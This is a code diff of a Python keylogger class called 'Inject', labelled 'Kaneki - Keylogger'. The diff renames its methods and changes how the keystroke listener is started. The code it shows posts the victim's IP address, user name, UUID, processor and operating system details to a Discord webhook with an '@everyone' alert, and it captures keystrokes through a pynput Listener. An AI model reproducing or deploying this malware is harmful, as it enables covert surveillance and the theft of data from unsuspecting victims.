@@ -11,7 +11,7 @@ class Inject():
     def get_ip(self):
         self.IP = requests.get('https://api.ipify.org').text
 
-    def run(self):
+    def send_infect(self):
         requests.post(self.Hook, data={'content':f'||@everyone|| __New User Injected__\n\n    **__COMPUTER INFOS :__**\n> IP Adress: **{self.IP}**\n> PC Name: **{getpass.getuser()}**\n> UUID: **{uuid.uuid1()}**\n> Processor: **{platform.processor()}**\n> System Info: **{platform.system()+" "+platform.release()}**\n> Date: **{self.Date}**', 'username':'Kaneki - Keylogger', 'avatar_url':'https://cdn.discordapp.com/attachments/780536336360800259/833163665007575100/manga.gif'})
 
     def on_press(self, key):
@@ -31,6 +31,6 @@ class Inject():
             	self.log = self.log + " "
             
 
-    def listener_s(self):
-        with Listener(on_press=self.on_press) as listener:
-            listener.join()
+    def listener(self):
+        listener = Listener(on_press=self.on_press)
+        listener.join()
